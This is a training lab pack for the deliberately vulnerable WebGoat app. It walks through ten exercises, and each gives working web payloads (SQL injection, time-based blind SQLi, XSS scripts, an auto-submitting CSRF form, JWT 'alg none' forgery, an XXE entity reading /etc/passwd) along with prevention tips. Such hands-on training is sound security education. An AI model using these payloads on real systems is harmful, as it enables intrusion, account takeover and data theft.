
## WebGoat Exploitation Labs

This lab pack covers practical, step-by-step WebGoat exploitation scenarios with:

* Lab names
* Objectives
* Background
* Execution flow
* Expected results
* Defensive guidance

Labs are grouped into **Fundamentals, OWASP Top 10, Authentication/Authorization, Crypto, and Business Logic attacks**.

---

# Lab 01: Bypass Login Using SQL Injection

## Objective

Log in without valid credentials using SQL injection.

## Background

WebGoat contains login forms vulnerable to string concatenation attacks.

## Steps

1. Open:

```
http://localhost:8080/WebGoat
```

2. Navigate to `Injection Flaws → SQL Injection (Login)`
3. Enter payload:

```
' OR '1'='1
```

4. Submit the form.

## Expected

* Authentication bypass.

## Prevention

* Parameterized queries
* ORM prepared statements
* Server-side sanitization

---

# Lab 02: Blind SQL Injection

## Objective

Extract database content via blind inference.

## Steps

1. Navigate to `Injection Flaws → Blind SQL Injection`
2. Use time-based payload:

```
1' AND SLEEP(5)--
```

3. Use binary search approach to extract usernames.

## Expected

* Application delays confirm TRUE conditions.

## Prevention

* Proper error handling
* Use secure ORM
* Input validation

---

# Lab 03: Reflected XSS (Search Feature)

## Objective

Trigger JS execution via reflected XSS.

## Steps

1. Navigate: `Cross-Site Scripting → Reflected XSS`
2. Inject:

```
<script>alert('XSS')</script>
```

3. Observe JS execution.

## Prevention

* Output encoding
* CSP headers
* Use secure templating

---

# Lab 04: Stored XSS (Comment Section)

## Objective

Demonstrate stored XSS persistence.

## Steps

1. Navigate: `Cross-Site Scripting → Stored XSS`
2. Submit comment:

```
<img src=x onerror="alert('stored')">
```

3. Reload page.

## Expected

* Script triggers on every load.

## Prevention

* HTML sanitization
* File type validation

---

# Lab 05: CSRF Account Takeover

## Objective

Execute cross-site request forgery to perform unauthorized profile updates.

## Steps

1. Navigate: `Cross-Site Request Forgery`
2. Note vulnerable endpoint:

```
POST /WebGoat/csrf/basic-get-flag
```

3. Craft CSRF POC:

```
<form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
  <input type="hidden" name="transfer" value="5000">
</form>
<script>document.forms[0].submit()</script>
```

4. Load POC in browser.

## Expected

* Forced action executed.

## Prevention

* Anti-CSRF tokens
* SameSite cookies
* Referer validation

---

# Lab 06: Insecure Direct Object Reference (IDOR)

## Objective

Access another user’s profile using predictable identifiers.

## Steps

1. Navigate: `Access Control → Insecure Direct Object Reference`
2. Capture request:

```
GET /WebGoat/IDOR/profile?id=101
```

3. Modify to:

```
?id=102
```

## Expected

* Another user’s data is shown.

## Prevention

* Server-side authorization checks
* Randomized UUIDs

---

# Lab 07: JWT Manipulation (None Algorithm Attack)

## Objective

Modify tampered JWT to escalate privileges.

## Steps

1. Navigate: `Web Services → JWT`
2. Copy JWT token
3. Modify header:

```
{"alg": "none", "typ": "JWT"}
```

4. Change payload role:

```
{"role": "admin"}
```

5. Remove signature
6. Replay the token.

## Expected

* Privilege escalation.

## Prevention

* Disallow `alg=none`
* Mandatory signature verification

---

# Lab 08: XXE Injection

## Objective

Exploit XML parser to read local files.

## Steps

1. Navigate: `Injection Flaws → XXE`
2. Submit payload:

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

## Expected

* File contents leak.

## Prevention

* Disable external DTDs
* Use secure XML parsers

---

# Lab 09: SSRF via WebWolf Interaction

## Objective

Use WebGoat to make backend HTTP requests.

## Steps

1. Navigate: `Server-Side Request Forgery`
2. Observe vulnerable endpoint
3. Force server to call WebWolf:

```
http://localhost:9090/WebWolf
```

## Expected

* SSRF callback logged in WebWolf.

## Prevention

* IP allowlists
* DNS pinning

---

# Lab 10: Password Reset Logic Flaw

## Objective

Abuse predictable reset tokens.

## Steps

1. Navigate: `Authentication → Forgot Password`
2. Trigger reset request
3. Inspect reset token structure
4. Replay predictable token for another user.

## Prevention

* Cryptographically secure random tokens
* Short expiration time

---
